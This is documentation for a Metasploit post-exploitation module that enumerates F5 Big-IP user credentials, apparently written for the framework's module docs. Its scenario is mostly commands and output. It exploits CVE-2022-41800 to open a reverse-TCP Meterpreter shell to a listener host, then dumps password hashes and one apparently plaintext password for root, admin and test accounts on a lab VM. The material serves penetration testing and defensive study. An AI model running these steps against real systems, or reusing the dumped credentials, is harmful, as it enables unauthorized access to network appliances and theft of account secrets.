## Vulnerable Application

The application is F5 Big-IP, and I don't think the versions matters but I
tested on version 17.0.0.1. It can be downloaded as a VMWare image for free
(you have to create an account) from https://downloads.f5.com. You can register
for a free 30-day trial if you like, but it's not required to test this.

Boot the VM and set an admin password by logging in with the default credentials
(admin / admin). You'll need that password.

## Verification Steps

1. Install the application
2. Start `msfconsole`
3. Do: Get any session somehow (`exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800` works well on 17.0.0.1 and earlier, or just use `msfvenom`)
4. Do: `use post/linux/gather/f5_enum_users`
5. Do `set SESSION <sessionid>`
6. Do: `run`
7. You should get the info

## Options

n/a

## Scenarios

### F5 Big-IP 17.0.0.1 with a root session

First, get a non-root session however you can. I used the rpmspec vuln:

```
msf6 > use exploit/linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set HttpPassword mybigtestpassword
HttpPassword => iagotestbigip
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set RHOST 10.0.0.162
RHOST => 10.0.0.162
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > set LHOST 10.0.0.179
LHOST => 10.0.0.179
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > exploit
[*] Started reverse TCP handler on 10.0.0.179:4444 
[*] Sending stage (40168 bytes) to 10.0.0.162
[+] Deleted /var/config/rest/node/tmp/708677fa-5b30-43e6-9ce3-d84046e9f6e9.spec
[+] Deleted /var/config/rest/node/tmp/RPMS/noarch/yE15kZeAwp-1.6.1-7.4.4.noarch.rpm
[*] Meterpreter session 1 opened (10.0.0.179:4444 -> 10.0.0.162:36124) at 2022-11-14 16:12:04 -0800

meterpreter > bg
```

Then just use the module, set the SESSION, and run it:

```
msf6 exploit(linux/http/f5_icontrol_rpmspec_rce_cve_2022_41800) > use post/linux/gather/f5_enum_users
msf6 post(linux/gather/f5_enum_users) > set SESSION 1
SESSION => 1
msf6 post(linux/gather/f5_enum_users) > exploit

[+] admin / $6$Iyzm/x1c$gvlmWSdmj7M/NBUM9DO41LHmC1qDBxM/IMjlUfqLZatVVXHPUvo9/hFDrP1Qg3qHIC0g.O9/dq4TPgDdE3W1z.
[+] f5hubblelcdadmin / qsVgr34GRROUnQhTSvL2h1Q6NtLE9hpp
[+] rontest / $6$vVUv0eWT$RGvezgWWLpEa5WfKNumg7b04w2cz87r8TAZ0mxiAvYveDmTRu3h3KUwirAhiFOZ6LcttWxO2XS0MNAhkqaSN11
[+] root / $6$hWKQCz3U$QE39QIT8ILbdah.k85LMnvKqjq3IIPge3bfM9UAiaUy.leyzHwpjYqQ7jJxSwN1PiFjKB28ofVi6rvenaxh9l/
[+] msftest / $6$lb5UKQa8$.v/xIGpI7pvP9NCQttoDG3DUFuayJIJqs/pWrDZwhVtxygzjyiyH/J4TejPEOb/6uJXzmyUd22KiwSoTbE.qP1
[+] msftest10 / $6$SsTj4F5Q$ct0NRCUNGrAkIF7z/XSsUhF5DY1FwDgvGMxh6w09/Zm1jpu0Sj1v8LXRbEtuHlUrtaGMNGcRuU9EZYNjThEar0
[*] Post module execution completed
```
